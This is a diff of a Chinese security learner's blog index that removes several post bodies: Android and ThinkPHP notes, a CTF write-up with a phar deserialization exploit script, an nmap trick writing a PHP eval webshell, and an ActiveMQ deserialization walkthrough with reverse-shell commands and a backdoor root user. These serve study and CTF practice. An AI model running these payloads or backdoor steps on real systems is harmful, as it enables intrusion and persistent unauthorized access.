@@ -132,18 +132,7 @@
   <time datetime="2020-10-06T01:16:23.000Z" itemprop="datePublished">2020-10-06</time>
 </a>    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <p>[TOC]</p> 
-      <a class="article-more-link" href="/2020/10/06/%E5%AE%89%E5%8D%93%E4%B9%8B%E6%97%85-2/"
-        >阅读更多...</a
-      >
-       
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
@@ -184,68 +173,7 @@
   <time datetime="2020-10-05T12:13:35.000Z" itemprop="datePublished">2020-10-05</time>
 </a>    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="Android-1"><a href="#Android-1" class="headerlink" title="Android-1"></a>Android-1</h1><h2 id="一、四大组件与系统架构"><a href="#一、四大组件与系统架构" class="headerlink" title="一、四大组件与系统架构"></a>一、四大组件与系统架构</h2><h3 id="（一）Android四大组件"><a href="#（一）Android四大组件" class="headerlink" title="（一）Android四大组件"></a>（一）Android四大组件</h3><p>1、Activity</p>
-<p>一个Activity通常就是一个单独的窗口。Activity之间通过Intent进行通信。Activity应用中每一个Activity都必须要在AndroidManifest.xml配置文件中声明，否则系统将不识别也不执行该Activity。</p>
-<p>2、Service</p>
-<p>Started（启动）：当应用程序组件（如Activity）调用StartService()方法启动服务时，服务处于Started状态。</p>
-<p>bound（绑定）：当应用程序组件调用bindService()方法绑定到服务时，服务处于bound状态。</p>
-<p>Service通常位于后台运行，它一般不需要与用户交互，因此Service组件没有图形用户界面。Service组件需要继承Service基类。Service组件通常用于为其他组件提供后台服务或监控其他组件的运行状态。</p>
-<p>3、Content provider</p>
-<p>Android平台提供了Content Provider使一个应用程序的指定数据集提供给其他应用程序。其他应用可以通过ContentResolver类从该内容提供者中获取或存入数据。</p>
-<p>只有需要在多个应用程序间共享数据是才需要内容提供者。例如，通讯录数据被多个应用程序使用，且必须存储在一个内容提供者中。它的好处是统一数据访问方式。</p>
-<p>ContentProvider实现数据共享。ContentProvider用于保存和获取数据，并使其对所有应用程序可见。这是不同应用程序间共享数据的唯一方式，因为android没有提供所有应用共同访问的公共存储区。</p>
-<p>开发人员不会直接使用ContentProvider类的对象，大多数是通过ContentResolver对象实现对ContentProvider的操作。5、ContentProvider使用URI来唯一标识其数据集，这里的URI以content://作为前缀，表示该数据由ContentProvider来管理。</p>
-<p>4、Broadcast Receiver</p>
-<p>你的应用可以使用它对外部事件进行过滤，只对感兴趣的外部事件(如当电话呼入时，或者数据网络可用时)进行接收并做出响应。广播接收器没有用户界面。然而，它们可以启动一个activity或serice来响应它们收到的信息，或者用NotificationManager来通知用户。通知可以用很多种方式来吸引用户的注意力，例如闪动背灯、震动、播放声音等。一般来说是在状态栏上放一个持久的图标，用户可以打开它并获取消息。</p>
-<p>广播接收者的注册有两种方法，分别是程序动态注册和AndroidManifest文件中进行静态注册。</p>
-<p>动态注册广播接收器特点是当用来注册的Activity关掉后，广播也就失效了。静态注册无需担忧广播接收器是否被关闭，只要设备是开启状态，广播接收器也是打开着的。也就是说哪怕app本身未启动，该app订阅的广播在触发时也会对它起作用。</p>
-<h3 id="（二）Android系统架构"><a href="#（二）Android系统架构" class="headerlink" title="（二）Android系统架构"></a>（二）Android系统架构</h3><p><code>Android</code>采用分层的架构，分为四层，从高层到底层分为<code>应用程序层</code>（app+System apps），<code>应用程序框架层</code>（Java API Framework），<code>系统运行库和运行环境层</code>(Libraries + android Runtime)和<code>Linux核心层</code>(HAL+ Linux Kernel)</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ib7IG2SLFIxp1gSuTBlnlR5pWGicpjpHSrNeals6aTv0P8WlrkdabYfpnyJEMmdGb6IRich5PxqKGNg/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
-<h3 id="三-Android常用开发与逆向命令总结"><a href="#三-Android常用开发与逆向命令总结" class="headerlink" title="(三) Android常用开发与逆向命令总结"></a>(三) Android常用开发与逆向命令总结</h3><p>1、<code>file</code>查看文件属性</p>
-<p>2、使用<code>echo</code>命令写内容到文件中，然后利用<code>cat</code>读取文件内容。</p>
-<p>3、使用<code>dumpsys</code>命令获取当前顶层<code>activity</code>的信息，grep进行过滤，-i参数忽略大小写。</p>
-<p>4、<code>ls -alit</code>按时间排序显示当前目录全部信息。</p>
-<p>5、<code>dumpsys package com.termux</code>查看该APP内存中的信息</p>
-<p>6、<code>ps -e</code>显示全部进程</p>
-<p><code>ps -e |grep -i termux </code>筛选命令</p>
-<p>7、dumpsys dbinfo com.termux查看数据库信息</p>
-<p>8、<code>adb pull /sdcard/app</code>将手机中的文件拷贝到电脑当前目录下</p>
-<p><code>adb push D:\tmp.txt /sdcard</code>将本地文件放到手机中</p>
-<p>9、<code>adb logcat</code>查看当前日志信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb logcat |grep -i com.termux</span><br></pre></td></tr></table></figure>
-
-<p>10、指定连接某台设备的<code>adb shell</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb -s 192.168.3.18:5555 shell</span><br></pre></td></tr></table></figure>
-
-<p>11、查看某端口对应的进程名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -tunlp |grep 7001  # 端口</span><br><span class="line">netstat -tunlp |grep &quot;com.termux&quot; # 进程名</span><br><span class="line">netstat -aple |grep -i https #正在通信的端口，查看使用https的通信</span><br></pre></td></tr></table></figure>
-
-<p>12、<code>htop</code>实时查看手机进程</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg install htop</span><br></pre></td></tr></table></figure>
-
-<p>手机<code>root</code>用户查看<code>htop</code>，全部进程</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ su</span><br><span class="line"># &#x2F;data&#x2F;data&#x2F;com.termux&#x2F;files&#x2F;usr&#x2F;bin&#x2F;htop</span><br></pre></td></tr></table></figure>
-
-<p>一本书的链接：<a target="_blank" rel="noopener" href="http://yuedu.163.com/book_reader/581dbb97c3424be08ab582cf64735cde_4">http://yuedu.163.com/book_reader/581dbb97c3424be08ab582cf64735cde_4</a></p>
-<h2 id="二、手机刷机指北"><a href="#二、手机刷机指北" class="headerlink" title="二、手机刷机指北"></a>二、手机刷机指北</h2><p><strong>环境也是分3,6,9等的</strong></p>
-<p><strong>Frida两套环境：</strong></p>
-<p>1、pixel(sailfish)+官方8.1.0_r1+twrp3.3.0+Magisk+Frida</p>
-<p>2、pixel(sailfish)+twrp3.3.0+lineage16.0+addonsu16.0</p>
-<p><strong>Xposed一套环境：</strong></p>
-<p>1、pixel(sailfish)+官方7.1.2_r8+twrp3.2.1-0+SuperSU+XposedInstaller</p>
-<p><strong>Fart同Aosp两套环境：</strong></p>
-<p>1、pixel(sailfish)+最新fastboot+Fart8.1.0</p>
-<p>2、n6p(angler)+老fastboot+Fart8.1.0</p>
-<p><strong>Kali NetHunter一套环境：</strong></p>
-<p>1、n6p(angler)+原生8.1.0_r1+twrp3.3.1+SuperSu</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
@@ -290,44 +218,7 @@
   </div>
    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="2020巅峰极客部分WP"><a href="#2020巅峰极客部分WP" class="headerlink" title="2020巅峰极客部分WP"></a>2020巅峰极客部分WP</h1><p>参考链接:<a target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/2634.html">https://www.gem-love.com/ctf/2634.html</a></p>
-<p>主要不是题目的解答，看了颖奇大佬的文章，再根据自己在做题目的过程中记忆，对题目单纯的进行理论上的复现，原理是一样的</p>
-<h2 id="BabyPhp2"><a href="#BabyPhp2" class="headerlink" title="BabyPhp2"></a>BabyPhp2</h2><p>打开题目</p>
-<p><img src="https://i.loli.net/2020/09/28/V6MiunxmdfpzkEC.png"></p>
-<p>这里提示已经很明显了，这里登陆不上的。</p>
-<p>然后扫目录，得到<a target="_blank" rel="noopener" href="http://www.zip,源码泄漏,然后打开源码,进行源码的分析/">www.zip，源码泄漏，然后打开源码，进行源码的分析</a></p>
-<p><img src="https://i.loli.net/2020/09/28/zUTKC5ySladEGtF.png"></p>
-<p>文件读取的漏洞，但是这个读取方法里面的有waf，魔术方法就需要制造调用，构建POP链。现在就是要找到这个链头了。</p>
-<p><img src="https://i.loli.net/2020/09/28/Xar8jLGyDCcxM2e.png"></p>
-<p>有一个魔术方法之中有修改的内容，可以这里是可以利用，接下来就是想办法将 这个地方包含进来还要执行这条链。剩下的就是<code>file_get_contents</code>这个函数了。利用伪协议将php文件读取进来，还要能够执行。<code>phar</code>伪协议满足要求。但是</p>
-<p><img src="https://i.loli.net/2020/09/28/QN7ylUWLEfZrwCu.png"></p>
-<p>已经被销毁了。这里提醒一下，伪协议是可以联合使用的。</p>
-<p><code>compress.zlib://phar://</code></p>
-<p>这样就可以绕过限制读取文件，再加上那个upload.php上传的时候改一个名字，问题也就解决了。下面贴上大佬的脚本。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age&#x3D;null;</span><br><span class="line">    public $nickname&#x3D;null;</span><br><span class="line">    public $backup;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;nickname &#x3D; new Reader();</span><br><span class="line">        $this-&gt;backup &#x3D; &quot;&#x2F;flag&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public $token;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;token &#x3D; new User;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class Reader&#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$y1ng &#x3D; new dbCtrl();</span><br><span class="line"></span><br><span class="line">$phar &#x3D; new Phar(&quot;web1.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">$phar-&gt;setMetadata($y1ng);</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">@rename(&quot;web1.phar&quot;, &quot;y1ng.gif&quot;);</span><br></pre></td></tr></table></figure>
-
-<p>之后将gif上传即可</p>
-<p><img src="https://i.loli.net/2020/09/28/2pFyVEOhMnDPSwd.png"></p>
-<p>这里利用是否有序列化的数据出现判断是否协议生效，这样就可以调节文件路径到底是怎样的。</p>
-<p>phar反序列参考链接：<a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p>
-<h1 id="MeowWorld"><a href="#MeowWorld" class="headerlink" title="MeowWorld"></a>MeowWorld</h1><p>这道题有个Hint：<code>register_argc_argv</code></p>
-<p>然后这个题很容易看出漏洞是本地文件包含，并且限制了包含的目录，就别想逃出来了。</p>
-<p>然后就是利用pear这个包管理器，下载我们自己的马儿，然后，包含，来命令执行。</p>
-<p><img src="https://i.loli.net/2020/09/28/yDpaCFUfLvwQm2E.png"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;index.php?f&#x3D;&#x2F;usr&#x2F;share&#x2F;pear&#x2F;pearcmd&amp;+list</span><br></pre></td></tr></table></figure>
-
-<p>这个就相当于在本地运行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear list</span><br></pre></td></tr></table></figure>
-
-<p>这样也就不难猜到提示词的用意了。</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
@@ -368,19 +259,7 @@
   <time datetime="2020-09-24T23:55:27.000Z" itemprop="datePublished">2020-09-25</time>
 </a>    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <h2 id="记nmap使用的几个小点"><a href="#记nmap使用的几个小点" class="headerlink" title="记nmap使用的几个小点"></a>记nmap使用的几个小点</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-oN 标准保存</span><br><span class="line">-oX XML保存</span><br><span class="line">-oG Grep保存  nmap -F -oG test.txt 192.168.23.1 以标准格式、XML格式和Grep格式一次性保存，分别放在.nmap，.xml和.gnmap文件中。</span><br><span class="line">-oA 保存到所有格式  nmap -F -oA test 192.168.3.2</span><br><span class="line">-append-output 补充保存文件</span><br></pre></td></tr></table></figure>
-
-<h2 id="构造webshell时的小点"><a href="#构造webshell时的小点" class="headerlink" title="构造webshell时的小点"></a>构造webshell时的小点</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当php，三个字被过滤时，可以使用短符号</span><br><span class="line">&lt;?&#x3D;来代替&lt;?php进行绕过</span><br></pre></td></tr></table></figure>
-
-<p><code>&#39; &lt;?= @eval($_POST[&quot;cmd&quot;]);?&gt;</code> -oG shell.phtml ‘</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
@@ -423,20 +302,7 @@
   </div>
    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="ThinkPhp-5"><a href="#ThinkPhp-5" class="headerlink" title="ThinkPhp-5"></a>ThinkPhp-5</h1><h2 id="模版的条件判断标签"><a href="#模版的条件判断标签" class="headerlink" title="模版的条件判断标签"></a>模版的条件判断标签</h2><h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;switch number&#125; </span><br><span class="line">&#123;case 1&#125;1&#123;&#x2F;case&#125;</span><br><span class="line">&#123;case 5&#125;5&#123;&#x2F;case&#125;</span><br><span class="line">&#123;case 10&#125;10&#123;&#x2F;case&#125; </span><br><span class="line">&#123;default&#x2F;&#125;不存在 &#123;&#x2F;switch&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;if ($number &gt; 10) and ($number &lt; 20)&#125;</span><br><span class="line">    6666</span><br><span class="line">&#123;else if $number &#x3D;&#x3D; 10&#125;</span><br><span class="line">    8888</span><br><span class="line">&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure> 
-      <a class="article-more-link" href="/2020/09/23/ThinkPhp-5/"
-        >阅读更多...</a
-      >
-       
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
@@ -481,54 +347,7 @@
   </div>
    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="lt-ActiveMQ-反序列化漏洞-gt-待完全理解"><a href="#lt-ActiveMQ-反序列化漏洞-gt-待完全理解" class="headerlink" title="&lt;ActiveMQ 反序列化漏洞&gt;(待完全理解)"></a>&lt;ActiveMQ 反序列化漏洞&gt;(待完全理解)</h1><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p>
-<!--morer-->
-
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞利用过程如下：</p>
-<ol>
-<li>构造（可以使用ysoserial）可执行命令的序列化对象</li>
-<li>作为一个消息，发送给目标61616端口</li>
-<li>访问web管理页面，读取消息，触发漏洞</li>
-</ol>
-<p>使用<a target="_blank" rel="noopener" href="https://github.com/matthiaskaiser/jmet">jmet</a>进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。</p>
-<p>jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。</p>
-<p>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch &#x2F;tmp&#x2F;success&quot; -Yp ROME your-ip 61616</span><br></pre></td></tr></table></figure>
-
-<p>然后登陆页面</p>
-<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8161/admin/browse.jsp?JMSDestination=event">http://127.0.0.1:8161/admin/browse.jsp?JMSDestination=event</a></p>
-<p>点击消息，触发漏洞</p>
-<p>然后进入docker</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it   9a540c50a8dc  &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
-
-<p>如果在/tmp目录下存在success文件则显示成功</p>
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;12340&gt;&amp;1&quot; -Yp ROME 127.0.0.1   61616</span><br></pre></td></tr></table></figure>
-
-<p>外面用nc监听1234端口</p>
-<p>注意把攻击的命令进行base64编码，绕过java本身的限制</p>
-<p>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQzLjE5Mi83Nzc3IDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 192.168.43.192 61616</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -g root -s &#x2F;bin&#x2F;bash -u 10010 test</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &quot;s&#x2F;test:x:10010&#x2F;test:x:0&#x2F;g&quot; &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;test:sd123456&quot; | chpasswd</span><br></pre></td></tr></table></figure>
-
-<p>到这里就可以完全创建一个具有root权限的用户，稍后进行远程登陆就可以了。</p>
-<h2 id="jmet的使用"><a href="#jmet的使用" class="headerlink" title="jmet的使用"></a>jmet的使用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar target&#x2F;jmet-0.1.0-all.jar</span><br><span class="line">ERROR d.c.j.JMET [main] Misconfiguration: Missing required options: [-C Custom script exploitation mode, -Y Deser exploitation mode, -X XXE exploitation mode], [-T topic name, -Q queue name], I</span><br><span class="line">usage: jmet [host] [port]</span><br><span class="line"> -C,--Custom &lt;scriptname&gt;         Custom script exploitation mode</span><br><span class="line"> -f,--filter &lt;scriptname&gt;         filter script</span><br><span class="line"> -I,--impl &lt;arg&gt;                  ActiveMQ| Artemis| WebSphereMQ| Qpid10|</span><br><span class="line">                                  Qpid09| HornetQ| SwiftMQ| RabbitMQ|</span><br><span class="line">                                  OpenMQ</span><br><span class="line"> -pw,--password &lt;pass&gt;            password for authentication</span><br><span class="line"> -Q,--Queue &lt;name&gt;                queue name</span><br><span class="line"> -s,--substitute                  Substituation mode: Use §§ to pass</span><br><span class="line">                                  ysoserial payload name to CMD</span><br><span class="line"> -T,--Topic &lt;name&gt;                topic name</span><br><span class="line"> -u,--user &lt;id&gt;                   user for authentication</span><br><span class="line"> -v,--verbose                     Running verbose mode</span><br><span class="line"> -X,--XXE &lt;URL&gt;                   XXE exploitation mode</span><br><span class="line"> -Xp,--xxepayload &lt;payloadname&gt;   Optional: XXE Payload to use EXTERNAL|</span><br><span class="line">                                  PARAMATER| DTD</span><br><span class="line"> -Y,--ysoserial &lt;CMD&gt;             Deser exploitation mode</span><br><span class="line"> -Yp,--payload &lt;payloadname&gt;      Optional: Ysoserial Payload to use</span><br><span class="line">                                  BeanShell1| CommonsBeanutils1|</span><br><span class="line">                                  CommonsCollections1|</span><br><span class="line">                                  CommonsCollections2|</span><br><span class="line">                                  CommonsCollections3|</span><br><span class="line">                                  CommonsCollections4|</span><br><span class="line">                                  CommonsCollections5| Groovy1|</span><br><span class="line">                                  Hibernate1| Hibernate2| Jdk7u21| JSON1|</span><br><span class="line">                                  ROME| Spring1| Spring2</span><br><span class="line"> -Zc,--channel &lt;channel&gt;          channel name (only WebSphereMQ)</span><br><span class="line"> -Zq,--queuemanager &lt;name&gt;        queue manager name (only WebSphereMQ)</span><br><span class="line"> -Zv,--vhost &lt;name&gt;               vhost name (only AMQP-Brokers:</span><br><span class="line">                                  RabbitMQ|QPid09|QPid10)</span><br></pre></td></tr></table></figure>
-
-<p>其中的深层次的原理等待java+web学完之后回来补</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
@@ -573,21 +392,7 @@
   </div>
    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="ThinkPhp-第4天"><a href="#ThinkPhp-第4天" class="headerlink" title="ThinkPhp - 第4天"></a>ThinkPhp - 第4天</h1><h2 id="模版引擎和视图渲染-V"><a href="#模版引擎和视图渲染-V" class="headerlink" title="模版引擎和视图渲染(V)"></a>模版引擎和视图渲染(V)</h2><p>模版定位</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;指定模版</span><br><span class="line">      return $this-&gt;fetch(&#39;edit&#39;);#当前模块&#x2F;view&#x2F;当前控制器名(小写)&#x2F;当前操作(小写).html</span><br><span class="line">      &#x2F;&#x2F;指定目录下的模版</span><br><span class="line">      return $this-&gt;fetch(&#39;public&#x2F;edit&#39;);</span><br><span class="line">      &#x2F;&#x2F;指定模块下的模版</span><br><span class="line">      return $this-&gt;fetch(&#39;admin@public&#x2F;edit&#39;);</span><br><span class="line">      &#x2F;&#x2F;view_path 下的模版</span><br><span class="line">      return $this-&gt;fetch(&#39;&#x2F;edit&#39;);</span><br><span class="line">      &#x2F;&#x2F;助手函数view()</span><br><span class="line">      return view(&#39;&#39;)</span><br></pre></td></tr></table></figure>
-
-<h2 id="视图赋值和过滤"><a href="#视图赋值和过滤" class="headerlink" title="视图赋值和过滤"></a>视图赋值和过滤</h2> 
-      <a class="article-more-link" href="/2020/09/21/ThinkPhp-4/"
-        >阅读更多...</a
-      >
-       
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
@@ -632,29 +437,7 @@
   </div>
    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <h3 id="ThinkPhp-3"><a href="#ThinkPhp-3" class="headerlink" title="ThinkPhp-3"></a>ThinkPhp-3</h3><h2 id="模型查询范围和输出"><a href="#模型查询范围和输出" class="headerlink" title="模型查询范围和输出"></a>模型查询范围和输出</h2><h3 id="一、模型查询"><a href="#一、模型查询" class="headerlink" title="一、模型查询"></a>一、模型查询</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public function scopeGenderMale($query) &#123; </span><br><span class="line">    $query-&gt;where(&#39;gender&#39;, &#39;男&#39;) </span><br><span class="line">    -&gt;field(&#39;id,username,gender,email&#39;)-&gt;limit(5); </span><br><span class="line">    &#125;</span><br><span class="line">方法名必须以scope开头</span><br><span class="line">调用：</span><br><span class="line">$result &#x3D; UserModel::scope(&#39;gendermale&#39;)-&gt;select();</span><br><span class="line">&#x2F;&#x2F;$result &#x3D; UserModel::gendermale()-&gt;select(); </span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function scopeEmailLike($query, $value) </span><br><span class="line">&#123; $query-&gt;where(&#39;email&#39;, &#39;like&#39;, &#39;%&#39;.$value.&#39;%&#39;); &#125;</span><br><span class="line">public function scopePriceGreater($query, $value)</span><br><span class="line">&#123; $query-&gt;where(&#39;price&#39;, &#39;&gt;&#39;, 80); &#125;</span><br><span class="line">$result &#x3D; UserModel::emailLike(&#39;xiao&#39;)-&gt;priceGreater(80) -&gt;select();</span><br></pre></td></tr></table></figure>
-
-<p><strong>只能使用 find()和 select()两种方法</strong></p>
-<p>全局范围查询</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protected function base($query) &#123; $query-&gt;where(&#39;status&#39;, 1); &#125;</span><br></pre></td></tr></table></figure>
-
-<p>开关</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UserModel::useGlobalScope(false)</span><br></pre></td></tr></table></figure>
-
-<h3 id="二、模型输出"><a href="#二、模型输出" class="headerlink" title="二、模型输出"></a>二、模型输出</h3> 
-      <a class="article-more-link" href="/2020/09/20/ThinkPhP-3/"
-        >阅读更多...</a
-      >
-       
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
@@ -699,24 +482,7 @@
   </div>
    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="ThinkPhP学习第二天"><a href="#ThinkPhP学习第二天" class="headerlink" title="ThinkPhP学习第二天"></a>ThinkPhP学习第二天</h1><h2 id="聚合、原生、子查询"><a href="#聚合、原生、子查询" class="headerlink" title="聚合、原生、子查询"></a>聚合、原生、子查询</h2><h3 id="一、聚合查询"><a href="#一、聚合查询" class="headerlink" title="一、聚合查询"></a>一、聚合查询</h3><p>查询数量</p>
